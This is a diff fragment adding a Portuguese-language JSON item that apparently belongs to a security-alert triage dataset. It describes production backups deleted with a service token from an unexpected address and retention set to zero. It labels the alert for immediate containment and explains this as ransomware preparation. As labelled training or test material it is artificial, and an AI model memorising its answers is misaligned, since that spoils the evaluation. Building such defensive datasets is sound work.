+    "detalhe": "03:11 a 03:17: 37 das 40 cópias do pg-prod-01 excluídas com o token de svc-backup a partir de 10.0.0.141. Retenção alterada para 0 dias. Exclusões continuam.",
+    "ativo": "backup-prod",
+    "ambiente": "prod"
+   },
+   "contexto": [
+    "svc-backup só é usado a partir de 10.0.0.20 (servidor de backup).",
+    "Nenhuma mudança registrada para hoje."
+   ],
+   "acao": "contain_now",
+   "sinais": {
+    "atividade_esperada": false,
+    "ativo_critico": true,
+    "indicio_de_comprometimento": true,
+    "em_andamento": true
+   },
+   "nota": "difícil: backup — apagar cópias e zerar retenção, de origem estranha, é preparação clássica de sequestro de dados; revogar o token agora."
+  }
+ ]
+}
